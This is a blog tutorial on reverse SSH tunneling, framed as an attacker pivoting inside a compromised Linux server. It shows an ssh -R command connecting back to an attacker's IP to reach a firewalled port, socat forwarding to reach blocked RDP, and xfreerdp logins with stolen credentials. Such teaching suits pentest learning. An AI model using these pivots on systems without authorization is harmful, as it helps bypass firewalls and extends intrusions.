---
layout: post
title: Reverse SSH Tunneling
date: '2024-02-03 17:25:52 +0100'
categories: [Articles, Tutorials]
tags: [linux, ssh, administration]
---


Hello fellow hacker, 

In this article, we will be discovering an interesting topic, `Reverse SSH Tunneling`.

### Scenario

<img src="/../assets/ssh_tun0.png">

You, the attacker, somehow got some user credentials and accessed to the victim's linux server.

Upon doing some enumerations for privilege escalation and turning around in circles, you tried to list open ports on the machine.

```bash
$> ss -tunlp
Netid  State      Recv-Q Send-Q                                   Local Address:Port                                                  Peer Address:Port              
udp    UNCONN     0      0                                                    *:10000                                                            *:*                  
udp    UNCONN     0      0                                                    *:68                                                               *:*                  
tcp    LISTEN     0      128                                                  *:10000                                                            *:*                  
tcp    LISTEN     0      128                                                  *:22                                                               *:*                  
tcp    LISTEN     0      80                                           127.0.0.1:3306                                                             *:*                  
tcp    LISTEN     0      128                                                 :::80                                                              :::*                  
tcp    LISTEN     0      128                                                 :::22                                                              :::*                  
```

You come across an interesting thing ! An open port (10000 in this case) blocked by the firewall.

You investigate further, and you find out that is a website hosted there.
You can't of couse access it from your attacker's machine, since it is blocked by the firewall, nor access it from the victim's machine, since it doesn't have a GUI.

You can't obviously alter the firewall rules.

So, what should you do.. ?

Let’s me introduce you to to `Reverse SSH Tunneling`

Reverse SSH tunneling allows you to connect from the victim machine back to your attacker machine (think of it as a legit reverse shell), binding a specific port.

Here is the command ( on the victim’s machine )

```bash
ssh -R 10000:localhost:10000 yariss@10.11.60.242
```
What this does is you connect back to your attacker’s machine, binding the port 10000 on the victim’s machine, with port 10000 on your attacker’s machine.

Now if you try to access `[localhost:10000](http://localhost:10000)` , it will work !

> One important note, you need `ssh`  enabled on your attacker’s machine.

### Scenario 2

<img src="/../assets/ssh_tun1.png">

Imagine you (machine C) , got some set of credentials, and you want to try them on machine A and B.
you try them on machine A via `RDP`, and it works fine, you enumerate that machine but you find nothing interesting.
you try machine B, but `RDP port` is blocked by a firewall, no one can access that port except from machine A.

How can you rdp from machine C to B ?
You can bind port 3389 of machine B to a port on machine A, let's say `9999`, and RDP from machine C to machine A using port `9999`.
Once you are in, you will notice that you actually accessed machine B !

You can perform this process by utilizing `socat`
```bash
# on machine A
socat TCP4-LISTEN:9999,fork TCP4:<MACHINE_B_IP>:3389
```

Now that you successfully bound the ports, you can access machine B via RDP from machine C.
```bash
# on attacker's machine (C)
xfreerdp /v:Machine_A_IP:9999 /u:username /p:password
```

### SSH Tunnel vs Reverse SSH Tunnel

SSH Tunnel is straight forward, we will just establish a normal ssh connection, but we specify some binding options.

Going back to our previous example, we already have the credentials of the victim’s machine, we can ssh to it, but binding port `10000`  of that machine to our local machine like so :

```bash
ssh -L 10000:127.0.0.1:10000 victim@IP_OF_VICTIM
```



That was it for this article, I hope you learned something!